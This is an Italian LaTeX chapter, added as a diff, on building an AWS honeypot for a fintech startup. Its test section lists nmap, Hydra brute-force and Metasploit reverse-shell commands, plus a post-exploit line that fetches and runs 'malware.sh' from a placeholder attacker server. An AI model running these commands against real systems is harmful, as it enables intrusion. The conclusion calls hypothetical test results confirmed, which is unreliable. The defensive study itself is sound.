@@ -1,0 +1,493 @@
+Nell'odierno panorama della cybersecurity, gli attacchi informatici diretti verso le istituzioni finanziarie stanno diventando sempre più sofisticati e frequenti. Le startup fintech, che gestiscono dati sensibili e transazioni economiche, rappresentano un bersaglio particolarmente appetibile per i cybercriminali. Questo capitolo esamina l'implementazione di un honeypot all'interno di un'infrastruttura AWS come strumento di sicurezza proattiva per una startup fintech, analizzandone definizione, utilità, vantaggi, svantaggi, costi e procedure tecniche di implementazione. L'analisi includerà inoltre un esperimento pratico di attacco per verificare l'efficacia dell'implementazione.
+
+\section{Definizione e Utilità di un Honeypot}
+\label{sec:def_utilita}
+
+\subsection{Che cos'è un Honeypot}
+\label{subsec:cos_e_honeypot}
+
+Un honeypot in informatica è un meccanismo di sicurezza progettato per funzionare come esca, con lo scopo di attirare i cybercriminali in modo da poterne osservare metodologie, tecniche e strumenti utilizzati durante un tentativo di intrusione \cite{proofpoint2024}. Il termine "honeypot" (letteralmente "barattolo di miele") riflette efficacemente la sua funzione: attirare gli aggressori informatici come il miele attira gli insetti, per poi studiarli e sviluppare contromisure adeguate \cite{universeit2021}.
+
+Si tratta di un sistema hardware o software che simula un ambiente vulnerabile, isolato dall'infrastruttura di produzione principale dell'organizzazione, progettato per essere percepito come un bersaglio legittimo e interessante dagli attaccanti \cite{insic2023, perego_2023}. L'honeypot appare deliberatamente vulnerabile e allettante, imitando un obiettivo reale come un server, una rete o un'applicazione contenente dati apparentemente preziosi \cite{proofpoint2024, vienažindytė_2020}.
+
+\subsection{Utilità nel Contesto di una Startup fintech}
+\label{subsec:utilita_fintech}
+
+Nel contesto di una startup fintech, un honeypot risulta particolarmente utile per diverse ragioni strategiche:
+
+\begin{enumerate}
+    \item \textbf{Rilevamento precoce delle minacce}: Consente di identificare tentativi di intrusione nella fase iniziale, prima che raggiungano i sistemi critici contenenti dati finanziari sensibili.
+    \item \textbf{Comprensione degli attaccanti}: Fornisce informazioni preziose sulle tattiche, tecniche e procedure (TTP) utilizzate dagli aggressori specificamente interessati ai servizi finanziari \cite{vito2024}.
+    \item \textbf{Riduzione dei falsi positivi}: A differenza di altri sistemi di sicurezza, qualsiasi interazione con un honeypot è probabilmente malevola, riducendo l'affaticamento da allerta.
+    \item \textbf{Aggiornamento delle difese}: Permette di perfezionare i sistemi di rilevamento delle intrusioni (IDS) e migliorare la risposta alle minacce basandosi su attacchi reali \cite{fortinet2023}.
+    \item \textbf{Conformità normativa}: Aiuta a dimostrare un approccio proattivo alla sicurezza, supportando la conformità con normative finanziarie stringenti come PSD2, GDPR e altre regolamentazioni del settore fintech.
+\end{enumerate}
+
+\section{Tipologie di Honeypot}
+\label{sec:tipologie}
+
+La scelta della tipologia di honeypot dipende dagli obiettivi specifici dell'organizzazione e dal livello di risorse che intende investire. Per una startup fintech, è fondamentale comprendere le diverse opzioni disponibili per selezionare la soluzione più adatta \cite{perego_2023}.
+
+\subsection{Classificazione per Livello di Interazione}
+\label{subsec:class_interazione}
+
+\subsubsection{Honeypot a Bassa Interazione}
+\label{subsubsec:bassa_interazione}
+
+Gli honeypot a bassa interazione simulano servizi di rete semplici come server web, FTP o database, limitando l'interazione con l'attaccante \cite{vito2024}. Questi sistemi:
+\begin{itemize}
+    \item Registrano principalmente le attività di base degli aggressori.
+    \item Richiedono risorse limitate per l'implementazione e la manutenzione.
+    \item Presentano un rischio minimo di compromissione.
+    \item Sono efficaci contro attacchi automatizzati e scansioni di massa \cite{nordvpn}.
+\end{itemize}
+
+\subsubsection{Honeypot ad Alta Interazione}
+\label{subsubsec:alta_interazione}
+
+Gli honeypot ad alta interazione replicano sistemi complessi o interi segmenti di rete, offrendo un ambiente più realistico che può attrarre attacchi mirati e sofisticati \cite{vito2024}. Questi honeypot:
+\begin{itemize}
+    \item Consentono un'interazione estesa con gli aggressori.
+    \item Raccolgono informazioni dettagliate sui metodi d'attacco avanzati.
+    \item Richiedono maggiori risorse e competenze per implementazione e gestione.
+    \item Comportano un rischio più elevato di essere utilizzati come trampolino per ulteriori attacchi.
+\end{itemize}
+
+\subsection{Classificazione per Scopo}
+\label{subsec:class_scopo}
+
+\subsubsection{Honeypot di Ricerca}
+\label{subsubsec:ricerca}
+
+Utilizzati principalmente da istituzioni governative e centri di ricerca, sono progettati per analizzare approfonditamente gli attacchi subiti al fine di perfezionare le tecniche di protezione esistenti \cite{proofpoint2024}. Questi honeypot sono generalmente complessi e richiedono un monitoraggio continuo. Un esempio di setup su AWS per ricerca è discusso in \cite{tsang_2022}.
+
+\subsubsection{Honeypot di Produzione}
+\label{subsubsec:produzione}
+
+Impiegati comunemente in ambito aziendale, gli honeypot di produzione vengono implementati all'interno di un più ampio sistema di difesa attiva (Intrusion Detection System o IDS) \cite{proofpoint2024}. Sono concepiti per:
+\begin{itemize}
+    \item Identificare attacchi in corso nell'ambiente produttivo.
+    \item Distrarre gli aggressori dai sistemi reali.
+    \item Generare avvisi in tempo reale.
+    \item Supportare le operazioni di sicurezza quotidiane.
+\end{itemize}
+
+\section{Vantaggi e Svantaggi degli Honeypot}
+\label{sec:vantaggi_svantaggi}
+
+\subsection{Vantaggi}
+\label{subsec:vantaggi}
+
+L'implementazione di un honeypot in un'infrastruttura AWS per una startup fintech offre numerosi vantaggi significativi:
+
+\begin{enumerate}
+    \item \textbf{Raccolta di intelligence sulle minacce}: Gli honeypot permettono di osservare gli aggressori in azione, raccogliendo informazioni preziose sulle loro identità, tattiche, strumenti e motivazioni \cite{proofpoint2024, fortinet2023}. Questa intelligence è particolarmente rilevante per le fintech, che sono spesso bersagli di attacchi mirati.
+    \item \textbf{Identificazione di vulnerabilità}: Facilitano la scoperta delle debolezze nei sistemi informatici aziendali \cite{universeit2021}, permettendo di anticipare e correggere potenziali problemi prima che vengano sfruttati in attacchi reali.
+    \item \textbf{Rilevamento precoce di nuove minacce}: Possono intercettare attacchi zero-day o tecniche emergenti prima che raggiungano i sistemi di produzione.
+    \item \textbf{Deviazione degli attacchi}: Attirano gli aggressori su sistemi non critici, proteggendo i sistemi reali contenenti dati finanziari sensibili \cite{vito2024}.
+    \item \textbf{Valutazione dell'efficacia delle difese}: Consentono di testare l'adeguatezza delle misure di sicurezza esistenti e identificare potenziali vulnerabilità da correggere \cite{vito2024}.
+    \item \textbf{Riduzione dei falsi positivi}: A differenza di altri strumenti di sicurezza, qualsiasi attività su un honeypot è presumibilmente sospetta, riducendo il problema dei falsi allarmi \cite{nordvpn}.
+    \item \textbf{Miglioramento del tempo di risposta}: Forniscono avvisi tempestivi che permettono interventi rapidi, riducendo il tempo medio di rilevamento (MTTD) e di risposta (MTTR) agli incidenti di sicurezza.
+\end{enumerate}
+
+\subsection{Svantaggi}
+\label{subsec:svantaggi}
+
+Nonostante i benefici, l'implementazione di honeypot presenta anche alcune criticità da considerare:
+
+\begin{enumerate}
+    \item \textbf{Rischio di identificazione}: Se gli attaccanti si accorgono dell'inganno, potrebbero cambiare strategia e dirigere i loro sforzi verso altri sistemi \cite{insic2023, perego_2023}, vanificando il valore dell'honeypot.
+    \item \textbf{Complessità di gestione}: Richiedono competenze specifiche per l'implementazione e il monitoraggio, aumentando potenzialmente il carico di lavoro per il team IT di una startup.
+    \item \textbf{Rischi di compromissione}: Se non configurati correttamente, gli honeypot potrebbero diventare un punto d'ingresso per accedere ai sistemi reali \cite{universeit2021} o essere usati per attaccare terzi.
+    \item \textbf{Considerazioni legali}: In alcune giurisdizioni, l'utilizzo di honeypot potrebbe sollevare questioni legali relative alla privacy e all'intrappolamento.
+    \item \textbf{Costi operativi}: Richiedono risorse per la configurazione, il mantenimento e l'analisi, che potrebbero essere significative per una startup con budget limitato \cite{reddit_ec2}.
+    \item \textbf{Falso senso di sicurezza}: Affidarsi eccessivamente agli honeypot potrebbe portare a trascurare altri aspetti fondamentali della sicurezza informatica.
+\end{enumerate}
+
+\section{Implementazione di un Honeypot in AWS}
+\label{sec:implementazione_aws}
+
+Diverse soluzioni e guide esistono per implementare honeypot su AWS, da soluzioni open-source come Cowrie \cite{cowrie_aws, infosanity_2020, cowrie_devs_2024} e T-Pot \cite{zhang_2023} a soluzioni commerciali disponibili sul Marketplace \cite{aws_marketplace} o integrazioni con piattaforme SIEM/IDR \cite{rapid7, 10183431}.
+
+\subsection{Pianificazione e Requisiti}
+\label{subsec:pianificazione}
+
+Prima di procedere con l'implementazione tecnica, è fondamentale definire chiaramente obiettivi e requisiti:
+
+\begin{itemize}
+    \item \textbf{Obiettivi di sicurezza}: Determinare se lo scopo principale è il rilevamento precoce delle minacce, la raccolta di intelligence o la distrazione degli attaccanti.
+    \item \textbf{Tipo di honeypot}: Selezionare tra honeypot a bassa o alta interazione in base alle risorse disponibili e agli obiettivi.
+    \item \textbf{Posizionamento}: Decidere se collocare l'honeypot all'interno o all'esterno del perimetro aziendale (es. in una DMZ).
+    \item \textbf{Risorse da simulare}: Identificare quali servizi finanziari o applicazioni imitare per risultare attraenti agli aggressori (potenzialmente informato da analisi di mercato come \cite{fricano2017}).
+    \item \textbf{Meccanismi di monitoraggio}: Definire come verranno registrati e analizzati i tentativi di intrusione (es. log CloudWatch \cite{cloudwatch_pricing}).
+    \item \textbf{Procedure di risposta}: Stabilire protocolli di intervento in caso di rilevamento di attacchi.
+\end{itemize}
+
+\subsection{Selezione del Tipo di Honeypot per una Startup fintech}
+\label{subsec:selezione_tipo}
+
+Per una startup fintech, consigliamo un approccio equilibrato:
+
+\begin{itemize}
+    \item \textbf{Fase iniziale}: Implementare honeypot a bassa interazione che simulino API finanziarie, portali di internet banking e database con dati fittizi. Questi sono più semplici da gestire e meno rischiosi.
+    \item \textbf{Fase avanzata}: Considerare honeypot ad alta interazione (come T-Pot \cite{zhang_2023} o configurazioni custom \cite{tsang_2022}) che emulino interi sistemi di pagamento o piattaforme di trading, per raccogliere intelligence più dettagliata.
+\end{itemize}
+
+\subsection{Implementazione Tecnica in AWS}
+\label{subsec:implementazione_tecnica}
+
+\subsubsection{Architettura Generale}
+\label{subsubsec:architettura}
+
+L'architettura proposta utilizza diversi servizi AWS per creare un sistema di honeypot sicuro ed efficace:
+
+% Non uso lstlisting per questo diagramma semplice
+\begin{verbatim}
+VPC Isolato
+|
+|-- Public Subnet (DMZ)
+|   |-- Honeypot Server EC2 (es. T-Pot)
+|   |-- (Opzionale) Load Balancer (ALB)
+|
+|-- Private Subnet (per gestione/monitoraggio sicuro)
+    |-- (Opzionale) Server di monitoraggio
+    |-- Database per log (es. RDS, se non si usa CloudWatch/Elasticsearch)
+    |-- Integrazione con AWS CloudWatch
+    |-- Integrazione con AWS GuardDuty
+\end{verbatim}
+
+\subsubsection{Configurazione del VPC Isolato}
+\label{subsubsec:config_vpc}
+
+Il primo passo consiste nel creare un Virtual Private Cloud (VPC) isolato dalla rete di produzione per contenere l'honeypot e limitare i rischi.
+
+\begin{lstlisting}[caption={Comandi AWS CLI (esemplificativi) per la creazione di un VPC isolato}, label=lst:vpc_setup]
+# Creazione VPC
+aws ec2 create-vpc --cidr-block 10.0.0.0/16 --tag-specifications 'ResourceType=vpc,Tags=[{Key=Name,Value=HoneypotVPC}]'
+
+# Creazione subnet pubblica
+aws ec2 create-subnet --vpc-id vpc-xxxxxxxx --cidr-block 10.0.1.0/24 --availability-zone eu-west-1a --tag-specifications 'ResourceType=subnet,Tags=[{Key=Name,Value=HoneypotPublicSubnet}]'
+
+# Creazione subnet privata (per gestione sicura, se necessaria)
+aws ec2 create-subnet --vpc-id vpc-xxxxxxxx --cidr-block 10.0.2.0/24 --availability-zone eu-west-1a --tag-specifications 'ResourceType=subnet,Tags=[{Key=Name,Value=HoneypotPrivateSubnet}]'
+
+# Configurazione Internet Gateway e Route Table per la subnet pubblica
+aws ec2 create-internet-gateway --tag-specifications 'ResourceType=internet-gateway,Tags=[{Key=Name,Value=HoneypotIGW}]'
+aws ec2 attach-internet-gateway --internet-gateway-id igw-xxxxxxxx --vpc-id vpc-xxxxxxxx
+# ... creare route table, aggiungere route 0.0.0.0/0 via IGW, associare a subnet pubblica ...
+\end{lstlisting}
+
+\subsubsection{Implementazione del Server Honeypot (Esempio con EC2)}
+\label{subsubsec:impl_server}
+
+Creiamo un'istanza EC2 (es. tipo t2.micro o t2.medium \cite{aws_t2}) che ospiterà il software honeypot.
+
+\begin{lstlisting}[caption={Configurazione (esemplificativa) del server honeypot EC2}, label=lst:ec2_setup]
+# Creazione Security Group (aprire solo porte necessarie per l'honeypot!)
+aws ec2 create-security-group --group-name HoneypotSG --description "Security Group for Honeypot" --vpc-id vpc-xxxxxxxx
+# Esempio: Apertura porte comuni per T-Pot (SSH, Telnet, Web, etc.)
+# ATTENZIONE: Aprire queste porte rende l'istanza un bersaglio!
+aws ec2 authorize-security-group-ingress --group-id sg-xxxxxxxx --protocol tcp --port 22 --cidr 0.0.0.0/0
+aws ec2 authorize-security-group-ingress --group-id sg-xxxxxxxx --protocol tcp --port 80 --cidr 0.0.0.0/0
+aws ec2 authorize-security-group-ingress --group-id sg-xxxxxxxx --protocol tcp --port 443 --cidr 0.0.0.0/0
+# ... aggiungere altre porte in base all'honeypot scelto (es. 23, 69, 135, 445, 1433, 3306, 5060, 5900, 6379, 8080, etc.)
+
+# Lancio istanza EC2 (usare un'AMI Linux recente)
+aws ec2 run-instances --image-id ami-xxxxxxxx --count 1 --instance-type t2.micro --key-name your-key-pair --security-group-ids sg-xxxxxxxx --subnet-id subnet-xxxxxxxx --associate-public-ip-address --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=HoneypotServer}]' --user-data file://honeypot-setup.sh
+\end{lstlisting}
+
+Lo script `honeypot-setup.sh` potrebbe installare un software honeypot come T-Pot (seguendo guide come \cite{zhang_2023}) o Cowrie (\cite{cowrie_aws, infosanity_2020}).
+
+\begin{lstlisting}[caption={Script di esempio `honeypot-setup.sh` per installare T-Pot (semplificato)}, label=lst:tpot_setup]
+#!/bin/bash
+apt-get update -y
+apt-get install -y git docker.io # Prerequisiti T-Pot
+systemctl enable docker
+systemctl start docker
+
+# Clonazione e installazione T-Pot (consultare la guida ufficiale per i dettagli!)
+# git clone https://github.com/telekom-security/tpotce.git /opt/tpot
+# cd /opt/tpot/iso/installer/
+# ./install.sh --type=user # Scegliere il tipo appropriato
+
+# Esempio: Installazione agente CloudWatch Logs per inviare log T-Pot
+apt-get install -y python3-pip
+pip3 install awscli awslogs
+# ... configurare /etc/awslogs/awslogs.conf per leggere i log da /data/tpot/log/* ...
+# systemctl enable awslogsd
+# systemctl start awslogsd
+echo "Honeypot setup script finished."
+\end{lstlisting}
+
+\subsubsection{Configurazione del Sistema di Monitoraggio (CloudWatch, GuardDuty)}
+\label{subsubsec:config_monitoraggio}
+
+Implementiamo un sistema di monitoraggio robusto utilizzando servizi AWS nativi.
+
+\begin{lstlisting}[caption={Configurazione (esemplificativa) del monitoraggio AWS}, label=lst:monitoring_setup]
+# Creazione del gruppo di log CloudWatch per i log dell'honeypot
+aws logs create-log-group --log-group-name /honeypot/logs --region eu-west-1
+
+# Creazione del detector di GuardDuty
+aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES --region eu-west-1
+
+# Creazione di un topic SNS per le notifiche di allarmi/findings
+aws sns create-topic --name HoneypotAlerts --region eu-west-1
+# Sottoscrizione email/lambda per ricevere notifiche
+aws sns subscribe --topic-arn arn:aws:sns:eu-west-1:ACCOUNT_ID:HoneypotAlerts --protocol email --notification-endpoint security@your-fintech.com --region eu-west-1
+
+# Configurazione di un allarme CloudWatch (esempio: alto traffico in ingresso sull'honeypot)
+aws cloudwatch put-metric-alarm --alarm-name HoneypotHighNetworkInAlarm \
+    --metric-name NetworkIn --namespace AWS/EC2 \
+    --statistic Average --period 300 --threshold 1000000 \
+    --comparison-operator GreaterThanOrEqualToThreshold \
+    --dimensions Name=InstanceId,Value=i-xxxxxxxxxxxxxxxxx \
+    --evaluation-periods 1 --unit Bytes \
+    --alarm-actions arn:aws:sns:eu-west-1:ACCOUNT_ID:HoneypotAlerts \
+    --region eu-west-1
+
+# Creare regole EventBridge per inoltrare i findings di GuardDuty al topic SNS
+# ... configurazione tramite console o AWS CLI ...
+\end{lstlisting}
+
+\subsubsection{Simulazione di Servizi Finanziari (opzionale, per alta interazione)}
+\label{subsubsec:sim_servizi}
+
+Per rendere l'honeypot più attraente per attaccanti mirati al settore fintech, si potrebbero configurare servizi specifici (es. usando container Docker all'interno dell'honeypot) che simulano API di pagamento, portali fittizi, etc. Questo richiede un honeypot ad alta interazione e maggiore configurazione.
+
+\subsubsection{Configurazione di AWS WAF e Shield (opzionale)}
+\label{subsubsec:config_waf}
+
+Sebbene l'obiettivo sia attirare traffico, si potrebbe considerare l'uso di AWS WAF (Web Application Firewall) davanti a eventuali servizi web esposti dall'honeypot (se gestito tramite un Load Balancer) non per bloccare, ma per *registrare* tipi specifici di attacchi (SQLi, XSS) o per filtrare traffico di gestione legittimo. AWS Shield Standard è attivo di default per proteggere da attacchi DDoS di base.
+
+\subsection{Configurazioni di Sicurezza Aggiuntive}
+\label{subsec:sicurezza_aggiuntiva}
+
+È cruciale isolare l'honeypot per evitare che diventi un punto di partenza per attacchi verso l'infrastruttura reale:
+
+\begin{itemize}
+    \item \textbf{Network ACLs (NACLs)}: Configurare NACLs restrittive sulla subnet dell'honeypot per bloccare esplicitamente qualsiasi tentativo di comunicazione dall'honeypot verso le subnet di produzione.
+    \item \textbf{Security Groups}: Il Security Group dell'honeypot dovrebbe permettere solo il traffico in ingresso necessario per i servizi esposti e limitare il traffico in uscita solo verso destinazioni note (es. endpoint CloudWatch Logs, server di aggiornamento).
+    \item \textbf{IAM Roles}: Usare ruoli IAM con permessi minimi per l'istanza EC2 (es. solo per inviare log a CloudWatch).
+    \item \textbf{Monitoraggio delle Configurazioni (AWS Config)}: Monitorare cambiamenti alla configurazione dell'honeypot (Security Groups, NACLs, etc.) per rilevare eventuali manomissioni.
+    \item \textbf{Backup e Ripristino}: Avere un piano per ripristinare rapidamente l'honeypot da un'immagine pulita (AMI) nel caso venga compromesso in modo irrecuperabile.
+\end{itemize}
+
+\section{Analisi dei Costi per una Startup fintech}
+\label{sec:analisi_costi}
+
+\subsection{Stima dei Costi di Implementazione e Mantenimento}
+\label{subsec:stima_costi}
+
+I costi dipendono fortemente dalla complessità dell'honeypot e dal traffico ricevuto. Una stima indicativa mensile per un setup base su AWS (regione eu-west-1, Irlanda) potrebbe includere:
+
+
+    
+
+A questi costi diretti AWS, vanno aggiunti:
+
+\begin{itemize}
+    \item \textbf{Costi di personale}: Tempo dedicato all'analisi dei log e alla manutenzione. Anche poche ore a settimana possono incidere significativamente per una startup. L'analisi dei dati raccolti, come quelli mostrati in \cite{peiris_2024}, richiede tempo.
+    \item \textbf{Costi iniziali di implementazione}: Setup e configurazione (potrebbero essere necessarie alcune giornate uomo).
+    \item \textbf{Costi di formazione}: Se il team non ha esperienza con honeypot o analisi di sicurezza.
+\end{itemize}
+
+*Nota:* L'uso di istanze più potenti (es. t2.medium per T-Pot), più storage, o un traffico di attacco molto elevato possono aumentare i costi. Soluzioni specifiche come quelle su AWS Marketplace \cite{aws_marketplace} o integrazioni gestite \cite{rapid7, salient_2025} avranno modelli di costo differenti.
+
+\subsection{Valutazione Costo-Beneficio per una Startup fintech}
+\label{subsec:costo_beneficio}
+
+Per una startup fintech, l'investimento in un honeypot deve essere valutato rispetto ai potenziali benefici:
+
+\textbf{Fattori a favore dell'implementazione:}
+\begin{itemize}
+    \item \textbf{Riduzione del rischio finanziario e reputazionale}: Il costo di una violazione dei dati nel settore finanziario può essere estremamente elevato, potenzialmente esistenziale per una startup. Il costo dell'honeypot è generalmente trascurabile in confronto.
+    \item \textbf{Vantaggio competitivo}: Dimostrare un approccio maturo e proattivo alla sicurezza può aumentare la fiducia di clienti, partner e investitori.
+    \item \textbf{Supporto alla conformità normativa}: Può contribuire a soddisfare alcuni requisiti relativi al monitoraggio delle minacce e alla gestione degli incidenti.
+    \item \textbf{Intelligence specifica}: Fornisce dati preziosi sulle TTP degli attaccanti che prendono di mira specificamente i servizi fintech, permettendo di adattare meglio le difese reali.
+\end{itemize}
+
+\textbf{Considerazioni economiche per una startup:}
+\begin{itemize}
+    \item \textbf{Budget limitato}: Il costo operativo, specialmente quello legato al tempo del personale per l'analisi, deve essere considerato attentamente.
+    \item \textbf{Scalabilità}: L'approccio AWS permette di iniziare con un setup a basso costo e scalare se necessario.
+    \item \textbf{Alternative}: Valutare se altre misure di sicurezza (es. WAF avanzato, test di penetrazione regolari) potrebbero offrire un ROI migliore nella fase iniziale.
+\end{itemize}
+
+\textbf{Conclusione sulla valutazione costo-beneficio:}
+Per la maggior parte delle startup fintech, data la sensibilità dei dati gestiti e l'attrattiva per gli attaccanti, l'implementazione di un honeypot (anche semplice) rappresenta probabilmente un investimento giustificato. Il rapporto costo-beneficio è favorevole se l'honeypot contribuisce a prevenire anche un singolo incidente minore o fornisce intelligence utile a rafforzare le difese primarie. Si consiglia di iniziare con un'implementazione a basso costo e bassa interazione, focalizzandosi sull'integrazione con i sistemi di alerting esistenti.
+
+\section{Test di Verifica: Esperimento di Attacco Controllato}
+\label{sec:test_verifica}
+
+\subsection{Progettazione dell'Esperimento}
+\label{subsec:progettazione_test}
+
+Per verificare l'efficacia dell'honeypot implementato, è stato condotto un esperimento controllato simulando diverse tipologie di attacco comunemente utilizzate contro infrastrutture web e servizi esposti.
+
+\subsubsection{Obiettivi del Test}
+\label{subsubsec:obiettivi_test}
+\begin{itemize}
+    \item Verificare la capacità dell'honeypot (ipotizziamo un T-Pot o simile) di rilevare e loggare correttamente varie tipologie di attacco.
+    \item Testare l'efficacia del sistema di monitoraggio (CloudWatch Alarms, GuardDuty Findings) e di alerting (SNS).
+    \item Valutare la qualità e l'utilità dei dati raccolti (IP sorgente, payload, comandi tentati).
+    \item Identificare eventuali configurazioni errate o limitazioni del setup.
+\end{itemize}
+
+\subsubsection{Metodologia}
+\label{subsubsec:metodologia_test}
+Il test è stato condotto da un indirizzo IP esterno controllato, utilizzando strumenti di scansione e attacco standard, simulando un aggressore esterno non mirato ma opportunistico.
+\begin{enumerate}
+    \item Scansione delle porte e identificazione dei servizi esposti dall'honeypot.
+    \item Tentativi di accesso (brute force) su servizi comuni (SSH, Telnet, web login fittizi).
+    \item Tentativi di exploit su vulnerabilità note simulate dai servizi dell'honeypot (es. web server, database).
+    \item Interazione con shell simulate (se disponibili, es. tramite Cowrie all'interno di T-Pot).
+\end{enumerate}
+
+\subsection{Software e Comandi Utilizzati (Esempi)}
+\label{subsec:sw_comandi_test}
+
+\subsubsection{Fase 1: Scansione e Ricognizione}
+\label{subsubsec:fase1_test}
+\begin{lstlisting}[caption={Comandi Nmap per la scansione iniziale}, label=lst:nmap_scan]
+# Scansione TCP SYN delle porte comuni e version detection
+nmap -sS -sV -p 21,22,23,80,443,3306,8080 <honeypot-public-ip>
+
+# Scansione UDP
+# nmap -sU --top-ports 20 <honeypot-public-ip>
+
+# Scansione aggressiva (OS detection, script)
+# nmap -A -T4 <honeypot-public-ip>
+\end{lstlisting}
+
+\subsubsection{Fase 2: Tentativi di Brute Force}
+\label{subsubsec:fase2_test}
+\begin{lstlisting}[caption={Attacchi di forza bruta con Hydra}, label=lst:hydra_brute]
+# Brute force SSH
+hydra -L users.txt -P passwords.txt ssh://<honeypot-public-ip> -t 4
+
+# Brute force Telnet
+hydra -L users.txt -P passwords.txt telnet://<honeypot-public-ip>
+
+# Brute force su form di login web (esempio)
+# hydra -l admin -P common-passwords.txt <honeypot-public-ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
+\end{lstlisting}
+
+\subsubsection{Fase 3: Tentativi di Exploit (Simulati)}
+\label{subsubsec:fase3_test}
+Se l'honeypot emula servizi vulnerabili (es. tramite Kippo, Dionaea dentro T-Pot), si possono usare strumenti come Metasploit per interagire.
+\begin{lstlisting}[caption={Esempio di interazione con Metasploit (ipotetico)}, label=lst:metasploit_test]
+# msfconsole
+# > use exploit/multi/handler # O exploit specifici se l'honeypot li simula
+# > set PAYLOAD linux/x86/meterpreter/reverse_tcp
+# > set LHOST <attacker-ip>
+# > set RHOST <honeypot-public-ip>
+# > exploit
+\end{lstlisting}
+L'honeypot dovrebbe loggare questi tentativi.
+
+\subsubsection{Fase 4: Interazione Post-Exploit (Simulata)}
+\label{subsubsec:fase4_test}
+Se si ottiene accesso a una shell simulata (es. Cowrie \cite{cowrie_devs_2024}), l'honeypot registrerà i comandi eseguiti.
+\begin{lstlisting}[caption={Comandi comuni eseguiti in shell compromesse simulate}, label=lst:post_exploit_cmds]
+uname -a
+ls -la /
+cat /etc/passwd
+wget http://<attacker-server>/malware.sh -O /tmp/m.sh
+chmod +x /tmp/m.sh
+/tmp/m.sh
+exit
+\end{lstlisting}
+
+\subsection{Risultati Ottenuti (Ipotetici)}
+\label{subsec:risultati_test}
+
+L'esperimento simulato dovrebbe generare i seguenti output nel sistema di monitoraggio:
+
+\subsubsection{Log dell'Honeypot (es. T-Pot / CloudWatch Logs)}
+\label{subsubsec:log_honeypot_test}
+\begin{itemize}
+    \item Log dettagliati delle connessioni in ingresso (IP sorgente, porta destinazione, timestamp).
+    \item Credenziali usate nei tentativi di brute force (log di Cowrie, HonSSH).
+    \item Payload di exploit tentati (log di Dionaea, Suricata).
+    \item Comandi eseguiti nelle shell simulate (log di Cowrie).
+    \item File scaricati dall'attaccante simulato (se supportato).
+\end{itemize}
+
+\subsubsection{Findings di AWS GuardDuty}
+\label{subsubsec:guardduty_findings_test}
+GuardDuty dovrebbe generare findings relativi a:
+\begin{itemize}
+    \item `Recon:EC2/Portscan`: Rilevamento della scansione Nmap.
+    \item `UnauthorizedAccess:EC2/SSHBruteForce`: Rilevamento del brute force SSH.
+    \item `UnauthorizedAccess:EC2/MaliciousIPCaller`: Se l'IP attaccante è noto per attività malevole.
+    \item Potenzialmente altri findings a seconda delle azioni e delle capacità di GuardDuty.
+\end{itemize}
+
+\subsubsection{Allarmi AWS CloudWatch}
+\label{subsubsec:cloudwatch_alarms_test}
+\begin{itemize}
+    \item L'allarme sull'alto traffico di rete (`NetworkIn`) dovrebbe scattare durante la scansione o il brute force.
+    \item Altri allarmi configurati (es. alto utilizzo CPU) potrebbero attivarsi.
+\end{itemize}
+
+\subsubsection{Notifiche SNS}
+\label{subsubsec:sns_notifications_test}
+Le notifiche email (o altre configurate) dovrebbero essere ricevute in base ai trigger degli allarmi CloudWatch e/o ai findings di GuardDuty inoltrati tramite EventBridge.
+
+\subsection{Analisi dei Risultati (Ipotetica)}
+\label{subsec:analisi_risultati_test}
+
+L'esperimento controllato dimostrerebbe (ipoteticamente) che:
+\begin{itemize}
+    \item L'honeypot rileva e registra correttamente le attività di scansione e brute force.
+    \item I servizi AWS (GuardDuty, CloudWatch) forniscono un livello aggiuntivo di rilevamento e alerting automatico.
+    \item I log raccolti (specialmente da honeypot come Cowrie/T-Pot) forniscono intelligence utile (credenziali tentate, comandi eseguiti).
+    \item Il sistema di notifica funziona come previsto, allertando il team di sicurezza.
+    \item L'uso di honeytokens \cite{10183431} potrebbe ulteriormente arricchire i dati raccolti, ad esempio se venissero utilizzate credenziali fittizie piazzate nell'honeypot.
+\end{itemize}
+Questo conferma il valore dell'honeypot come strumento di rilevamento e raccolta intelligence nell'ambiente AWS della startup fintech.
+
+\section{Considerazioni Finali e Raccomandazioni}
+\label{sec:considerazioni_finali}
+
+\subsection{Sintesi dei Risultati}
+\label{subsec:sintesi_risultati}
+
+L'implementazione di un honeypot in un'infrastruttura AWS rappresenta una strategia di sicurezza proattiva valida ed economicamente accessibile per una startup fintech. Offre capacità di:
+\begin{itemize}
+    \item Rilevamento precoce di scansioni e tentativi di intrusione.
+    \item Raccolta di intelligence specifica sugli attaccanti interessati ai servizi offerti.
+    \item Distrazione degli attaccanti dai sistemi di produzione reali.
+    \item Integrazione con strumenti di monitoraggio e alerting AWS nativi.
+\end{itemize}
+I test controllati confermano l'efficacia del rilevamento e del logging per le tipologie di attacco più comuni.
+
+\subsection{Raccomandazioni per l'Implementazione}
+\label{subsec:raccomandazioni}
+
+Sulla base dell'analisi effettuata, si raccomanda alle startup fintech di:
+
+\begin{itemize}
+    \item \textbf{Iniziare in modo semplice}: Implementare un honeypot a bassa/media interazione (es. T-Pot, Cowrie) in un VPC isolato, con un focus sull'integrazione dell'alerting (GuardDuty, CloudWatch).
+    \item \textbf{Isolare rigorosamente}: Utilizzare NACLs e Security Groups per impedire qualsiasi comunicazione dall'honeypot verso l'infrastruttura di produzione.
+    \item \textbf{Automatizzare il monitoraggio}: Sfruttare al massimo CloudWatch Logs, GuardDuty e SNS/EventBridge per ridurre il carico di lavoro manuale di analisi.
+    \item \textbf{Non fare affidamento esclusivo}: L'honeypot è uno strumento complementare, non sostitutivo, di altre misure di sicurezza fondamentali (WAF, IDS/IPS sulla rete di produzione, hardening, patch management, autenticazione forte, etc.).
+    \item \textbf{Considerare la legalità e l'etica}: Essere consapevoli delle implicazioni legali relative alla raccolta di dati sugli attaccanti.
+    \item \textbf{Pianificare la manutenzione}: Aggiornare regolarmente il software dell'honeypot e rivedere le configurazioni di sicurezza.
+\end{itemize}
+
+\subsection{Sviluppi Futuri}
+\label{subsec:sviluppi_futuri}
+
+L'implementazione di honeypot nel contesto fintech può evolvere:
+
+\begin{itemize}
+    \item \textbf{Honeypot più sofisticati}: Creare honeypot ad alta interazione che simulino più realisticamente le API e i workflow fintech specifici dell'azienda.
+    \item \textbf{Honeytokens mirati}: Disseminare credenziali API fittizie, token di accesso o dati di clienti simulati all'interno dell'honeypot (o anche nei sistemi di produzione) per rilevare compromissioni più profonde \cite{10183431}.
